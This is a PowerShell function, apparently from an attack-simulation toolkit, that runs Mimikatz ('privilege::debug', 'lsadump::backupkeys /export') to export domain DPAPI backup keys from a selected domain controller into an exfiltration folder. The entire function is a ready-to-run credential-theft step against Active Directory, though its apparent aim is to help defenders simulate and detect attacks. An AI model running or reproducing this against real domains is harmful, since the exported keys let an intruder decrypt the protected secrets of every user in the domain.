<#
.SYNOPSIS
Attempts to export domain DPAPI backup keys from a selected domain controller.

.FUNCTIONALITY
Attempts to export domain DPAPI backup keys and lists matching files in the output folder.
Exposed domain backup keys can help recover user DPAPI master keys when the corresponding encrypted data is available.
#>
function Export-DPAPIBackupKey {

    ################################################################################
    #####                                                                      ##### 
    #####   Export domain DPAPI backup keys using Mimikatz                      #####
    #####                                                                      #####
    ################################################################################

    $Info = Measure-FunctionRuntime -Begin

    Write-AS2GoOutput -Type Header -Message "Export DPAPI Backup Keys from a Domain Controller"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    New-Item $Script:DefautExfiltrationFolder -ItemType directory -ErrorAction Ignore
    
    $dn = Select-ADObject -DomainSelectionOnly -Title "Select a domain for the DPAPI backup key export"
    $server = Get-BestDomainController -domain $dn
    
    Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "cd $Script:DefautExfiltrationFolder" "privilege::debug" "lsadump::backupkeys /system:$server /export" "exit" }
    
    get-item "$Script:DefautExfiltrationFolder\ntds_*" | Sort-Object LastWriteTime -Descending | out-host
    
    Write-AS2GoOutput -Type Info -Message "Attempted to export domain DPAPI backup keys from '$server' to '$Script:DefautExfiltrationFolder'."
    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    
    Measure-FunctionRuntime -End -Details $Info
}
